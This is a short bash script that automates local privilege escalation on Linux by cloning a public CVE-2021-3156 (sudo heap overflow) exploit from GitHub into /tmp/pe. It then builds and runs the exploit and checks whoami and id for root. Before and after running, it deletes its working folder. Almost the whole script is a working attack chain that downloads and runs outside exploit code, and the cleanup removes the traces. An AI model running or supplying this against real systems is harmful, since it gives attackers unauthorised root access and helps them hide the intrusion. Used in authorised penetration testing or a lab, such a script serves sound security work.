#!/bin/bash

# Check if privilege escalation folder exists
if [ -d "/tmp/pe" ]
then
	# Clean Up Before Automation
	cd /
	rm -rf /tmp/pe
	
	# Download CVE-2021-3156 Exploit
	echo "whoami: $(whoami)"
	mkdir /tmp/pe
	cd /tmp/pe
	git clone https://github.com/CptGibbon/CVE-2021-3156.git

	# Build and Run Exploit
	cd CVE-2021-3156
	make
	./exploit | echo "Exploit ran."
	echo "whoami: $(whoami)"
	echo "id: $(id)"
else
	# Download CVE-2021-3156 Exploit
	echo "whoami: $(whoami)"
	mkdir /tmp/pe
	cd /tmp/pe
	git clone https://github.com/CptGibbon/CVE-2021-3156.git

	# Build and Run Exploit
	cd CVE-2021-3156
	make
	./exploit | echo "Exploit ran."
	echo "whoami: $(whoami)"
	echo "id: $(id)"
fi

# Clean Up After Automation
cd /
rm -rf /tmp/pe